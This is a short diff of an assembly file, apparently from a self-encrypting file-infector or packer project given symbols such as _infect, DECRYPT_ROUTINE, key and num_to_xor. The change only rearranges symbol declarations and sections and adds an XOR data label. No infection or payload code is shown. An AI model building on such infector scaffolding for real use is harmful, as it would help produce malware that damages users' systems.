@@ -1,19 +1,20 @@
-section .textstart
+; z1
 global _infect
 global _infect_push
 global _infect_pop
-
-global key
-
-global opt
-global test_area
-
-global data
 global dataearly
+global key
+global fingerprint
+; z2
+global data
+global opt
 global iscompressed
 global environ
 global seed
-global fingerprint
+; z3
+global num_to_xor
+global test_area
+
 
 extern entry
 extern decrypt
@@ -21,11 +22,10 @@ extern DECRYPT_ROUTINE
 extern cmpr_start
 extern cmpr_end
 
-global environ
-
 ;
 ; ZONE 1
 ;____________
+section .textstart
 
 _infect:
 _infect_push:
@@ -105,3 +105,4 @@ data2:
 
 section .text
 test_area: db `AAAAAAAAAAAAAAA`,0
+num_to_xor: db `00000000`
